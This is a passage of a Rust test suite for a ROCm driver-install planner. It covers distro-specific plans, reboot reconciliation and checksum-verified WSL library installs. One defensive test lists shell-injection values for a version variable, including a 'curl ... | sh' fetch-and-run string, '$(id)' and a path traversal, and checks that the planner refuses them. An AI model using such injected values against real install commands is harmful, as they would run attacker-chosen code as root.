            executed_at_unix_ms: None,
            pre_driver: test_examine("linux", false).driver,
            post_driver: None,
            boot_id_at_execution: Some("boot".to_owned()),
            reboot_required: plan.reboot_required,
            reboot_observed: false,
            commands: plan.execution_commands(),
            reconciled_at_unix_ms: None,
            reconciliation: None,
        };
        let mut observed = Vec::new();

        execute_driver_install_plan(
            &plan,
            &mut state,
            |command| {
                observed.push(command.to_owned());
                Ok(())
            },
            |_| Ok(()),
            || Ok(test_examine("linux", false).driver),
        )?;

        assert_eq!(observed, expected);
        assert!(
            verify_commands
                .iter()
                .all(|command| !observed.contains(command)),
            "reboot-gated Verify commands must be deferred: {verify_commands:?}"
        );
        assert!(state.executed_at_unix_ms.is_some());
        assert!(state.reboot_required);
        Ok(())
    }

    #[test]
    fn failed_driver_verify_does_not_mark_execution_completed() -> Result<()> {
        let (root, paths) = test_paths("driver-verify-failure-state");
        let mut plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
        plan.commands = vec![
            driver_command(DriverCommandPhase::Prepare, "prepare"),
            driver_command(DriverCommandPhase::Execute, "execute"),
            driver_command(DriverCommandPhase::Verify, "verify"),
        ];
        let mut state = DriverInstallState {
            approved_at_unix_ms: 1,
            executed_at_unix_ms: None,
            pre_driver: test_examine("linux", true).driver,
            post_driver: None,
            boot_id_at_execution: Some("boot".to_owned()),
            reboot_required: plan.reboot_required,
            reboot_observed: false,
            commands: plan.execution_commands(),
            reconciled_at_unix_ms: None,
            reconciliation: None,
        };
        write_driver_install_state(&paths, &state)?;
        let mut observed = Vec::new();
        let mut gathered = false;

        let error = execute_driver_install_plan(
            &plan,
            &mut state,
            |command| {
                observed.push(command.to_owned());
                if command == "verify" {
                    bail!("verification rejected the install");
                }
                Ok(())
            },
            |state| write_driver_install_state(&paths, state),
            || {
                gathered = true;
                Ok(test_examine("linux", true).driver)
            },
        )
        .expect_err("failed verification must fail the install");
        let saved = read_driver_install_state(&paths)?.expect("state should remain readable");

        assert_eq!(observed, ["prepare", "execute", "verify"]);
        assert!(error.to_string().contains("driver command failed: verify"));
        assert!(
            !gathered,
            "post-install state must not be gathered after failure"
        );
        assert_eq!(state.executed_at_unix_ms, None);
        assert!(state.post_driver.is_none());
        assert_eq!(saved.executed_at_unix_ms, None);
        assert!(saved.post_driver.is_none());
        let _ = fs::remove_dir_all(root);
        Ok(())
    }

    #[test]
    fn failed_post_driver_gather_keeps_executed_state_persisted() -> Result<()> {
        let (root, paths) = test_paths("driver-gather-failure-state");
        let mut plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
        plan.commands = vec![
            driver_command(DriverCommandPhase::Prepare, "prepare"),
            driver_command(DriverCommandPhase::Execute, "execute"),
            driver_command(DriverCommandPhase::Verify, "verify"),
        ];
        let mut state = DriverInstallState {
            approved_at_unix_ms: 1,
            executed_at_unix_ms: None,
            pre_driver: test_examine("linux", true).driver,
            post_driver: None,
            boot_id_at_execution: Some("boot".to_owned()),
            reboot_required: plan.reboot_required,
            reboot_observed: false,
            commands: plan.execution_commands(),
            reconciled_at_unix_ms: None,
            reconciliation: None,
        };
        write_driver_install_state(&paths, &state)?;

        let error = execute_driver_install_plan(
            &plan,
            &mut state,
            |_| Ok(()),
            |state| write_driver_install_state(&paths, state),
            || bail!("post-driver gather failed"),
        )
        .expect_err("a post-driver gather failure must still fail the install");
        let saved = read_driver_install_state(&paths)?.expect("state should remain readable");

        assert!(error.to_string().contains("post-driver gather failed"));
        assert!(saved.executed_at_unix_ms.is_some());
        assert!(saved.post_driver.is_none());
        let _ = fs::remove_dir_all(root);
        Ok(())
    }

    #[test]
    fn driver_reconcile_without_state_gives_non_privileged_guidance() -> Result<()> {
        let (root, paths) = test_paths("driver-reconcile-empty");

        let rendered = reconcile_driver_install(&paths)?;

        assert!(rendered.contains("driver install reconciliation"));
        assert!(rendered.contains("approval: not required"));
        assert!(rendered.contains("privileged_commands: <none>"));
        assert!(rendered.contains("no prior driver execution state found"));
        assert!(rendered.contains("rocm install driver --dkms"));
        assert!(!driver_install_state_path(&paths).exists());
        let _ = fs::remove_dir_all(root);
        Ok(())
    }

    #[test]
    fn driver_reconcile_updates_state_after_reboot() -> Result<()> {
        let (root, paths) = test_paths("driver-reconcile-state");
        let pre_driver = rocm_core::DriverSummary {
            policy: "linux_official_amd_dkms_wrapper".to_owned(),
            status: "not_detected".to_owned(),
            detail: None,
        };
        let current_driver = rocm_core::DriverSummary {
            policy: "linux_official_amd_dkms_wrapper".to_owned(),
            status: "amdgpu_available".to_owned(),
            detail: Some("/dev/kfd is present".to_owned()),
        };
        let mut state = DriverInstallState {
            approved_at_unix_ms: 1,
            executed_at_unix_ms: Some(2),
            pre_driver,
            post_driver: None,
            boot_id_at_execution: Some("old-boot".to_owned()),
            reboot_required: true,
            reboot_observed: false,
            commands: vec!["sudo apt-get install -y amdgpu-dkms".to_owned()],
            reconciled_at_unix_ms: None,
            reconciliation: None,
        };
        let checks = vec![
            DriverPassiveCheck {
                name: "/dev/kfd".to_owned(),
                status: "present".to_owned(),
                detail: "KFD device node".to_owned(),
            },
            DriverPassiveCheck {
                name: "/dev/dri/renderD*".to_owned(),
                status: "missing".to_owned(),
                detail: "DRM render node".to_owned(),
            },
        ];

        let rendered = reconcile_driver_install_state(
            &paths,
            &mut state,
            current_driver,
            Some("new-boot".to_owned()),
            checks,
        )?;
        let saved = read_driver_install_state(&paths)?.expect("state should be saved");

        assert!(rendered.contains("reboot_observed: true"));
        assert!(rendered.contains("approval: not required"));
        assert!(rendered.contains("privileged_commands: <none>"));
        assert!(rendered.contains("driver_status: amdgpu_available"));
        assert!(rendered.contains("passive_check_summary: total=2 present=1 missing=1"));
        assert!(rendered.contains("/dev/dri/renderD*: missing"));
        assert!(rendered.contains("missing passive checks"));
        assert!(saved.reboot_observed);
        assert!(saved.reconciled_at_unix_ms.is_some());
        assert_eq!(
            saved
                .reconciliation
                .as_ref()
                .map(|value| value.driver.status.as_str()),
            Some("amdgpu_available")
        );
        let reconciliation = saved.reconciliation.as_ref().expect("reconciliation saved");
        assert_eq!(reconciliation.check_summary.total, 2);
        assert_eq!(reconciliation.check_summary.present, 1);
        assert_eq!(reconciliation.check_summary.missing, 1);
        let _ = fs::remove_dir_all(root);
        Ok(())
    }

    #[test]
    fn driver_reconcile_preserves_explicit_reboot_policy() -> Result<()> {
        for reboot_required in [false, true] {
            let (root, paths) = test_paths(if reboot_required {
                "driver-reconcile-reboot-true"
            } else {
                "driver-reconcile-reboot-false"
            });
            let driver = rocm_core::DriverSummary {
                policy: "driver-policy".to_owned(),
                status: "available".to_owned(),
                detail: None,
            };
            let mut state = DriverInstallState {
                approved_at_unix_ms: 1,
                executed_at_unix_ms: Some(2),
                pre_driver: driver.clone(),
                post_driver: None,
                boot_id_at_execution: Some("same-boot".to_owned()),
                reboot_required,
                reboot_observed: false,
                commands: vec!["execute".to_owned()],
                reconciled_at_unix_ms: None,
                reconciliation: None,
            };

            reconcile_driver_install_state(
                &paths,
                &mut state,
                driver,
                Some("same-boot".to_owned()),
                Vec::new(),
            )?;
            let saved = read_driver_install_state(&paths)?.expect("state should be saved");

            assert_eq!(state.reboot_required, reboot_required);
            assert_eq!(saved.reboot_required, reboot_required);
            let _ = fs::remove_dir_all(root);
        }
        Ok(())
    }

    #[test]
    fn driver_passive_check_summary_counts_non_present_as_missing() {
        let summary = summarize_driver_passive_checks(&[
            DriverPassiveCheck {
                name: "/dev/kfd".to_owned(),
                status: "present".to_owned(),
                detail: "KFD".to_owned(),
            },
            DriverPassiveCheck {
                name: "/dev/dri/renderD*".to_owned(),
                status: "missing".to_owned(),
                detail: "render".to_owned(),
            },
            DriverPassiveCheck {
                name: "dkms".to_owned(),
                status: "error".to_owned(),
                detail: "dkms status failed".to_owned(),
            },
        ]);

        assert_eq!(summary.total, 3);
        assert_eq!(summary.present, 1);
        assert_eq!(summary.missing, 2);
    }

    #[test]
    fn driver_plan_default_linux_preflight_has_no_execution_commands() {
        let _env = ScopedTestEnv::with_amd_overrides_cleared();
        let os_release = r#"
ID=ubuntu
VERSION_ID="24.04"
VERSION_CODENAME=noble
"#;
        let plan = build_driver_install_plan(
            &test_examine("linux", false),
            os_release,
            false,
            PrivilegeEscalation::Sudo,
        );
        let rendered = render_driver_install_plan(&plan, false, false);

        assert!(plan.supported);
        assert!(!plan.mutating);
        assert!(plan.commands.is_empty());
        assert!(rendered.contains("approval: not required"));
        assert!(rendered.contains("execution_commands: <none>"));
        assert!(!rendered.contains("sudo apt-get"));
        assert!(rendered.contains("add --dkms"));
    }

    #[test]
    fn resolve_shell_default_template_uses_default_when_env_unset() {
        let _env = ScopedTestEnv::new();
        // A made-up variable name that nothing else sets, cleared under the lock,
        // isolates the default path.
        assert_eq!(
            resolve_shell_default_template("${ROCM_CLI_TEST_UNSET_REPO_VERSION:-7.2.4}"),
            "7.2.4"
        );
    }

    #[test]
    fn resolve_shell_default_template_prefers_env_value_when_set() {
        let mut env = ScopedTestEnv::new();
        let var = "ROCM_CLI_TEST_REPO_VERSION_OVERRIDE";
        env.set(var, "9.9.9");
        assert_eq!(
            resolve_shell_default_template(&format!("${{{var}:-7.2.4}}")),
            "9.9.9"
        );
    }

    #[test]
    fn resolve_shell_default_template_treats_empty_env_as_unset() {
        let mut env = ScopedTestEnv::new();
        let var = "ROCM_CLI_TEST_REPO_VERSION_EMPTY";
        env.set(var, "");
        assert_eq!(
            resolve_shell_default_template(&format!("${{{var}:-7.2.4}}")),
            "7.2.4"
        );
    }

    #[test]
    fn resolve_shell_default_template_passes_through_non_template() {
        assert_eq!(resolve_shell_default_template("7.2.4"), "7.2.4");
    }

    #[test]
    fn resolve_shell_default_template_leaves_bare_var_untouched() {
        let _env = ScopedTestEnv::new();
        // No `:-default`, so there is nothing to resolve to; the input must pass
        // through unchanged rather than being partially rewritten.
        assert_eq!(
            resolve_shell_default_template("${ROCM_CLI_TEST_UNSET_REPO_VERSION}"),
            "${ROCM_CLI_TEST_UNSET_REPO_VERSION}"
        );
    }

    #[test]
    fn resolve_shell_default_template_leaves_nested_default_untouched() {
        let _env = ScopedTestEnv::new();
        // A nested default is beyond the flat matcher; returning the literal
        // input keeps a `${B:-x}` fragment from leaking as a "resolved" value.
        assert_eq!(
            resolve_shell_default_template("${ROCM_CLI_TEST_UNSET_A:-${ROCM_CLI_TEST_UNSET_B:-x}}"),
            "${ROCM_CLI_TEST_UNSET_A:-${ROCM_CLI_TEST_UNSET_B:-x}}"
        );
    }

    #[test]
    fn driver_plan_dry_run_repo_version_line_is_resolved() {
        let _env = ScopedTestEnv::with_amd_overrides_cleared();
        // Regression for the dry-run output leaking the raw shell placeholder on
        // the `repo_version:` line instead of the effective version.
        let os_release = r#"
ID=rhel
VERSION_ID="9.7"
"#;
        let plan = build_driver_install_plan(
            &test_examine("linux", false),
            os_release,
            true,
            PrivilegeEscalation::Sudo,
        );
        let rendered = render_driver_install_plan(&plan, false, true);

        assert!(rendered.contains("repo_version: 7.2.4"));
        assert!(!rendered.contains("repo_version: ${ROCM_CLI_AMDGPU_VERSION:-7.2.4}"));
    }

    #[test]
    fn driver_plan_debian_12_omits_linux_modules_extra() {
        let _env = ScopedTestEnv::with_amd_overrides_cleared();
        let os_release = r#"
ID=debian
VERSION_ID="12"
VERSION_CODENAME=bookworm
"#;
        let plan = build_driver_install_plan(
            &test_examine("linux", false),
            os_release,
            true,
            PrivilegeEscalation::Sudo,
        );
        let rendered = render_driver_install_plan(&plan, false, true);

        assert!(plan.supported);
        assert!(rendered.contains("approval: not required"));
        assert!(rendered.contains("linux-headers-$(uname -r)"));
        assert!(!rendered.contains("linux-modules-extra-$(uname -r)"));
        assert!(rendered.contains("amdgpu-dkms"));
        assert!(rendered.contains("dry run only"));
    }

    #[test]
    fn driver_plan_rhel_97_uses_documented_dnf_commands() {
        let _env = ScopedTestEnv::with_amd_overrides_cleared();
        let os_release = r#"
ID=rhel
VERSION_ID="9.7"
"#;
        let plan = build_driver_install_plan(
            &test_examine("linux", false),
            os_release,
            true,
            PrivilegeEscalation::Sudo,
        );
        let rendered = render_driver_install_plan(&plan, false, false);

        assert!(plan.supported);
        assert!(plan.mutating);
        assert_eq!(plan.policy, "linux_official_amd_dkms_wrapper");
        assert!(rendered.contains("`dnf` package manager is available"));
        assert!(rendered.contains("kernel-headers-$(uname -r)"));
        assert!(rendered.contains("kernel-devel-$(uname -r)"));
        assert!(rendered.contains("kernel-devel-matched-$(uname -r)"));
        assert!(rendered.contains("repo.radeon.com/amdgpu-install/7.2.4/rhel/9.7/"));
        assert!(rendered.contains("amdgpu-install-7.2.4.70204-1.el9.noarch.rpm"));
        assert!(rendered.contains("Execute: sudo dnf install -y amdgpu-dkms"));
        assert!(rendered.contains("approval: required"));
    }

    #[test]
    fn driver_plan_oracle_linux_101_uses_el_10_uek_flow() {
        let _env = ScopedTestEnv::with_amd_overrides_cleared();
        let os_release = r#"
ID=ol
VERSION_ID="10.1"
"#;
        let plan = build_driver_install_plan(
            &test_examine("linux", false),
            os_release,
            true,
            PrivilegeEscalation::Sudo,
        );
        let rendered = render_driver_install_plan(&plan, false, true);

        assert!(plan.supported);
        assert!(rendered.contains("approval: not required"));
        assert!(rendered.contains("kernel-uek-devel-$(uname -r)"));
        assert!(rendered.contains("repo.radeon.com/amdgpu-install/7.2.4/el/10/"));
        assert!(rendered.contains("amdgpu-install-7.2.4.70204-1.el10.noarch.rpm"));
        assert!(rendered.contains("dry run only"));
    }

    #[test]
    fn driver_plan_rocky_97_uses_el_dnf_flow() {
        let _env = ScopedTestEnv::with_amd_overrides_cleared();
        let os_release = r#"
ID=rocky
VERSION_ID="9.7"
"#;
        let plan = build_driver_install_plan(
            &test_examine("linux", false),
            os_release,
            true,
            PrivilegeEscalation::Sudo,
        );
        let rendered = render_driver_install_plan(&plan, false, false);

        assert!(plan.supported);
        assert!(
            rendered
                .contains("sudo dnf install -y kernel-headers kernel-devel kernel-devel-matched")
        );
        assert!(rendered.contains("repo.radeon.com/amdgpu-install/7.2.4/el/9.7/"));
        assert!(rendered.contains("Execute: sudo dnf install -y amdgpu-dkms"));
    }

    #[test]
    fn driver_plan_rocky_94_uses_el_dnf_flow() {
        let _env = ScopedTestEnv::with_amd_overrides_cleared();
        // Rocky 9.x point releases must resolve like RHEL 9.x, not just 9.7.
        let os_release = r#"
ID=rocky
VERSION_ID="9.4"
"#;
        let plan = build_driver_install_plan(
            &test_examine("linux", false),
            os_release,
            true,
            PrivilegeEscalation::Sudo,
        );
        let rendered = render_driver_install_plan(&plan, false, false);

        assert!(plan.supported);
        assert!(plan.mutating);
        assert!(rendered.contains("repo.radeon.com/amdgpu-install/7.2.4/el/9.4/"));
        assert!(rendered.contains("amdgpu-install-7.2.4.70204-1.el9.noarch.rpm"));
        assert!(rendered.contains("Execute: sudo dnf install -y amdgpu-dkms"));
    }

    #[test]
    fn driver_plan_rocky_8_and_10_remain_unsupported() {
        let _env = ScopedTestEnv::with_amd_overrides_cleared();
        // AMD documents Rocky Linux 9 only; keep the driver matrix scoped to 9.x.
        for version in ["8.10", "10.0"] {
            let os_release = format!("\nID=rocky\nVERSION_ID=\"{version}\"\n");
            let plan = build_driver_install_plan(
                &test_examine("linux", false),
                &os_release,
                true,
                PrivilegeEscalation::Sudo,
            );
            assert!(!plan.supported, "rocky {version} should be unsupported");
            assert!(!plan.mutating, "rocky {version} must not mutate");
            assert!(
                plan.commands.is_empty(),
                "rocky {version} must emit no commands"
            );
        }
    }

    #[test]
    fn driver_plan_debian_uses_intended_ubuntu_suite() {
        let _env = ScopedTestEnv::with_amd_overrides_cleared();
        // AMD's documented Debian install deliberately serves Debian from the
        // Ubuntu-suite graphics tree (Debian 12 -> jammy). Lock that in and
        // ensure the plan explains the mapping is intentional.
        let os_release = r#"
ID=debian
VERSION_ID="12"
VERSION_CODENAME=bookworm
"#;
        let plan = build_driver_install_plan(
            &test_examine("linux", false),
            os_release,
            true,
            PrivilegeEscalation::Sudo,
        );
        let rendered = render_driver_install_plan(&plan, false, true);

        assert!(plan.supported);
        assert_eq!(plan.codename, "jammy");
        assert!(rendered.contains("https://repo.radeon.com/graphics/7.2.4/ubuntu jammy main"));
        assert!(
            plan.reason
                .contains("intentionally uses AMD's Ubuntu-suite repository")
        );
    }

    #[test]
    fn driver_plan_sles_157_uses_documented_zypper_commands() {
        let _env = ScopedTestEnv::with_amd_overrides_cleared();
        let os_release = r#"
ID=sles
VERSION_ID="15.7"
"#;
        let plan = build_driver_install_plan(
            &test_examine("linux", false),
            os_release,
            true,
            PrivilegeEscalation::Sudo,
        );
        let rendered = render_driver_install_plan(&plan, false, false);

        assert!(plan.supported);
        assert!(rendered.contains("`zypper` package manager is available"));
        assert!(rendered.contains("SUSEConnect"));
        assert!(rendered.contains("sle-module-desktop-applications/15.7/x86_64"));
        assert!(rendered.contains("sudo zypper install -y kernel-default-devel"));
        assert!(rendered.contains("repo.radeon.com/amdgpu-install/7.2.4/sle/15.7/"));
        assert!(rendered.contains("sudo zypper --no-gpg-checks install -y"));
        assert!(rendered.contains("Execute: sudo zypper install -y amdgpu-dkms"));
        assert!(rendered.contains("approval: required"));
    }

    #[test]
    fn driver_plan_unsupported_linux_is_non_mutating() {
        let _env = ScopedTestEnv::with_amd_overrides_cleared();
        let os_release = r#"
ID=fedora
VERSION_ID="41"
"#;
        let plan = build_driver_install_plan(
            &test_examine("linux", false),
            os_release,
            true,
            PrivilegeEscalation::Sudo,
        );
        let rendered = render_driver_install_plan(&plan, false, false);

        assert!(!plan.supported);
        assert!(!plan.mutating);
        assert!(rendered.contains("unsupported_linux_dkms_plan"));
        assert!(rendered.contains("approval: not required"));
        assert!(rendered.contains("no driver commands will be executed"));
        assert!(!rendered.contains("sudo dnf install -y amdgpu-dkms"));
    }

    #[test]
    fn windows_install_driver_is_validate_only() {
        let _env = ScopedTestEnv::with_amd_overrides_cleared();
        let plan = build_driver_install_plan(
            &test_examine("windows", false),
            "",
            true,
            PrivilegeEscalation::Sudo,
        );
        let rendered = render_driver_install_plan(&plan, false, true);

        assert!(!plan.supported);
        assert!(!plan.mutating);
        assert_eq!(plan.policy, "windows_validate_only");
        assert!(rendered.contains("approval: not required"));
        assert!(rendered.contains("execution_commands: <none>"));
        assert!(rendered.contains("post_reboot_checks:"));
        assert!(rendered.contains("use `rocm examine`"));
        assert!(rendered.contains("rocm examine"));
        assert!(plan.commands.is_empty());
    }

    #[test]
    fn wsl_install_driver_installs_rocdxg_without_dkms() {
        // `dkms: true` is passed deliberately: WSL2 has no kernel module to
        // build, so the flag must not pull in the bare-metal path.
        //
        // `build_driver_install_plan` resolves `${ROCM_CLI_AMDGPU_VERSION:-...}`
        // from process env before it reaches the WSL branch, and the WSL branch
        // then reads the three ROCDXG vars — an exported
        // `ROCM_CLI_ROCDXG_VERSION` would steer this plan into a refusal and
        // fail the `plan.supported` assertion below. So this reader takes the
        // guard that clears both sets.
        let _env = scoped_rocdxg_env();
        let plan = build_driver_install_plan(
            &test_examine("linux", true),
            "",
            true,
            PrivilegeEscalation::Sudo,
        );
        let rendered = render_driver_install_plan(&plan, false, false);

        assert!(plan.supported);
        assert!(plan.mutating);
        assert_eq!(plan.policy, "wsl_rocdxg");
        assert!(!rendered.contains("amdgpu-dkms"));
        // The whole point of the bug: the plan must be runnable, and must not
        // send the user to a file that only exists in a git checkout.
        assert!(!rendered.contains("execution_commands: <none>"));
        assert!(!rendered.contains("scripts/"));
        assert!(rendered.contains("approval: required"));
    }

    #[test]
    fn wsl_rocdxg_plan_installs_the_library_and_publishes_it() {
        // Asserts on the default plan, so it has to take the same guard as the
        // mutating tests in this binary: a concurrent test exporting
        // `ROCM_CLI_ROCDXG_VERSION` would otherwise steer this one's plan.
        let _env = scoped_rocdxg_env();
        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
        let commands = plan.execution_commands().join("\n");

        // Fetches the release artifact, installs it, and makes the linker see
        // it. Any one of these missing leaves `wsl_rocdxg_ready` unreachable.
        assert!(commands.contains("https://github.com/ROCm/librocdxg/releases/download/"));
        assert!(commands.contains("rocdxg-roct_"));
        assert!(commands.contains("sudo apt-get install -y '/tmp/rocdxg-roct_"));
        assert!(commands.contains("sudo ldconfig"));

        // And in that order. `ldconfig` refreshes the cache from what is on
        // disk now, so running it before `apt-get install` has unpacked
        // `librocdxg.so` scans a directory that does not contain it yet and
        // publishes nothing — leaving the plan reporting success while the
        // `ldconfig -p` verification below is the only thing that would notice.
        // Both steps are still present under that swap, so every `contains`
        // assertion in this file stays green; only a position comparison
        // catches it.
        let steps = plan.execution_commands();
        let install = steps
            .iter()
            .position(|c| c.contains("apt-get install -y '/tmp/"))
            .expect("plan installs the package");
        let publish = steps
            .iter()
            .position(|c| c.trim_end().ends_with("ldconfig"))
            .expect("plan publishes the library");
        assert!(
            install < publish,
            "ldconfig must run after the package is installed:\n{}",
            steps.join("\n")
        );

        // Verification asserts the two things `examine` keys `wsl_rocdxg_ready`
        // on, so a silently partial install cannot report success.
        let verify = plan
            .commands
            .iter()
            .filter(|c| c.phase == DriverCommandPhase::Verify)
            .map(|c| c.command.clone())
            .collect::<Vec<_>>()
            .join("\n");
        assert!(verify.contains("/opt/rocm/lib/librocdxg.so"));
        assert!(verify.contains("ldconfig -p"));
    }

    #[test]
    fn wsl_rocdxg_plan_guards_the_gpu_plumbing_before_any_mutating_command() {
        // /dev/dxg and dxcore come from the Windows side. If they are missing,
        // installing the bridge library accomplishes nothing, so the plan must
        // stop rather than report a successful install of something inert.
        let _env = scoped_rocdxg_env();
        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
        let prepare = plan
            .commands
            .iter()
            .filter(|c| c.phase == DriverCommandPhase::Prepare)
            .map(|c| c.command.clone())
            .collect::<Vec<_>>();
        let joined = prepare.join("\n");
        assert!(joined.contains("/dev/dxg"));
        assert!(joined.contains("/usr/lib/wsl/lib/libdxcore.so"));
        // Named explicitly, rather than surfacing as `sudo: command not found`
        // from whichever privileged step happened to run first.
        assert!(joined.contains("command -v sudo"));
        // Both guards run before anything is fetched or installed.
        let first_mutation = plan
            .execution_commands()
            .iter()
            .position(|c| c.contains("apt-get") || c.contains("curl"))
            .expect("plan installs something");
        let last_guard = plan
            .execution_commands()
            .iter()
            .rposition(|c| c.contains("is missing"))
            .expect("plan guards the plumbing");
        assert!(
            last_guard < first_mutation,
            "plumbing guards must precede the first mutating command"
        );
    }

    /// Clear every input that steers the ROCDXG plan, so a value exported in
    /// the developer's or runner's shell cannot decide the outcome of a test
    /// that is asserting on the default.
    ///
    /// Builds on [`ScopedTestEnv::with_amd_overrides_cleared`] rather than
    /// `new` because a WSL plan reached through `build_driver_install_plan`
    /// resolves the bare-metal AMDGPU overrides before it dispatches to the WSL
    /// branch: a caller needing one of these two guards needs both, and one
    /// helper spares every test from picking the wrong half.
    fn scoped_rocdxg_env() -> ScopedTestEnv {
        let mut env = ScopedTestEnv::with_amd_overrides_cleared();
        env.clear("ROCM_CLI_ROCDXG_VERSION");
        env.clear(ROCDXG_SHA256_ENV);
        env.clear(ROCDXG_ALLOW_UNVERIFIED_ENV);
        env
    }

    #[test]
    fn wsl_rocdxg_download_is_verified_against_a_pinned_digest_by_default() {
        // The package is installed with `apt-get install`, which runs its
        // maintainer scripts as root. With no digest, TLS to the release host
        // is the only thing authenticating that download — weaker than the
        // bare-metal path in this same file, which installs from a
        // `signed-by=` pinned repository. So the default plan must verify.
        let _env = scoped_rocdxg_env();
        let commands = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo).execution_commands();
        let joined = commands.join("\n");

        let pinned = ROCDXG_PINNED_DIGESTS
            .iter()
            .find_map(|(version, digest)| (*version == "1.2.2").then_some(*digest))
            .expect("the default version is pinned");
        assert!(joined.contains(pinned), "{joined}");
        assert!(joined.contains("sha256sum -c -"), "{joined}");

        // Not a conditional: an unset variable must not be able to turn
        // verification off, which is what the previous `if [ -n ... ]` form
        // did.
        assert!(
            !joined.contains("skipping checksum verification"),
            "{joined}"
        );
        assert!(!joined.contains(ROCDXG_SHA256_ENV), "{joined}");

        // Ordering is the whole point — a digest checked after the install has
        // already run is decoration.
        let check = commands
            .iter()
            .position(|c| c.contains("sha256sum -c -"))
            .expect("plan verifies the download");
        let install = commands
            .iter()
            .position(|c| c.contains("apt-get install -y '/tmp/"))
            .expect("plan installs the package");
        assert!(check < install, "digest must be checked before install");
    }

    #[test]
    fn wsl_rocdxg_refuses_a_version_whose_digest_is_unknown() {
        // An unpinned version is the case where silently falling back to "no
        // verification" would be most dangerous, because it is reachable from
        // a single environment variable.
        let mut env = scoped_rocdxg_env();
        env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");

        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
        assert!(!plan.supported);
        assert!(!plan.mutating);
        assert!(plan.commands.is_empty(), "a refusal must run nothing");
        assert!(plan.reason.contains(ROCDXG_SHA256_ENV), "{}", plan.reason);
        assert!(
            plan.reason.contains(ROCDXG_ALLOW_UNVERIFIED_ENV),
            "{}",
            plan.reason
        );
    }

    #[test]
    fn wsl_rocdxg_accepts_a_supplied_digest_for_an_unpinned_version() {
        // The escape hatch for a release newer than this build: supply the
        // digest rather than disabling verification.
        let mut env = scoped_rocdxg_env();
        env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
        let supplied = "a".repeat(64);
        env.set(ROCDXG_SHA256_ENV, &supplied);

        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
        assert!(plan.supported);
        let joined = plan.execution_commands().join("\n");
        assert!(joined.contains(&supplied), "{joined}");
        assert!(joined.contains("sha256sum -c -"), "{joined}");
    }

    #[test]
    fn wsl_rocdxg_rejects_a_malformed_supplied_digest() {
        // A truncated or mistyped digest must not silently fall back to the
        // pinned one, which would verify a different artifact than the user
        // asked for and report success.
        let mut env = scoped_rocdxg_env();
        env.set(ROCDXG_SHA256_ENV, "not-a-digest");

        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
        assert!(!plan.supported);
        assert!(plan.commands.is_empty());
        assert!(plan.reason.contains(ROCDXG_SHA256_ENV), "{}", plan.reason);
    }

    #[test]
    fn wsl_rocdxg_unverified_install_takes_an_explicit_opt_out() {
        // Installing unverified stays possible — it just has to be asked for,
        // and the plan the user approves has to say so.
        let mut env = scoped_rocdxg_env();
        env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
        env.set(ROCDXG_ALLOW_UNVERIFIED_ENV, "1");

        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
        assert!(plan.supported);
        let joined = plan.execution_commands().join("\n");
        assert!(!joined.contains("sha256sum -c -"), "{joined}");
        assert!(joined.contains("without verifying it"), "{joined}");
    }

    #[test]
    fn wsl_rocdxg_opt_out_reads_negative_values_as_off() {
        // The opt-out is a boolean, not a presence check. Reading "set to
        // anything" as yes would turn digest verification off for a package
        // installed as root on the strength of `=0` — the one value a reader
        // writes when they mean the opposite.
        for negative in ["0", "false", "no", "off", ""] {
            let mut env = scoped_rocdxg_env();
            env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
            env.set(ROCDXG_ALLOW_UNVERIFIED_ENV, negative);

            let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
            assert!(
                !plan.supported,
                "{ROCDXG_ALLOW_UNVERIFIED_ENV}={negative:?} disabled verification"
            );
            assert!(
                plan.commands.is_empty(),
                "{ROCDXG_ALLOW_UNVERIFIED_ENV}={negative:?} built an unverified install"
            );
        }

        // The affirmative spellings still work, so this is a narrowing of what
        // counts as yes rather than a removal of the escape hatch.
        for affirmative in ["1", "true", "yes", "on"] {
            let mut env = scoped_rocdxg_env();
            env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
            env.set(ROCDXG_ALLOW_UNVERIFIED_ENV, affirmative);

            let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
            assert!(
                plan.supported,
                "{ROCDXG_ALLOW_UNVERIFIED_ENV}={affirmative:?} was not honoured"
            );
        }
    }

    #[test]
    fn wsl_rocdxg_refuses_a_version_that_could_escape_the_shell() {
        // `ROCM_CLI_ROCDXG_VERSION` is interpolated into commands executed via
        // `sh -c` after `apt-get update` has primed the sudo credential cache,
        // so a `;` in it would start a second, attacker-chosen command running
        // as root. The plan must refuse rather than quote its way out.
        for hostile in [
            "1.2.0; curl http://example.invalid/x | sh",
            "1.2.0 && id",
            "$(id)",
            "1.2.0`id`",
            "../../etc/passwd",
            "1.2.0\nid",
            "1.2.0 ",
        ] {
            let mut env = scoped_rocdxg_env();
            env.set("ROCM_CLI_ROCDXG_VERSION", hostile);
            // An opt-out must not buy past the version check either.
            env.set(ROCDXG_ALLOW_UNVERIFIED_ENV, "1");

            let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
            assert!(!plan.supported, "accepted hostile version {hostile:?}");
            assert!(
                plan.commands.is_empty(),
                "built commands from hostile version {hostile:?}"
            );
            // The refused value is echoed back in the plan a human reads, so it
            // must not be able to forge lines there. Every line the renderer
            // emits after the header is indented, so an unindented one came
            // from the value.
            let rendered = render_driver_install_plan(&plan, false, false);
            for line in rendered.lines().skip(1) {
                assert!(
                    line.starts_with("  "),
                    "hostile version {hostile:?} forged plan line {line:?} in:\n{rendered}"
                );
            }
        }
    }

    #[test]
    fn wsl_rocdxg_plan_drops_sudo_when_already_root() {
        // Same reason the bare-metal plans take an escalation: containers and
        // minimal cloud images run as uid 0 with no `sudo` binary, where an
        // unconditional prefix kills every command before any driver work.
        let _env = scoped_rocdxg_env();
        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::AlreadyRoot);
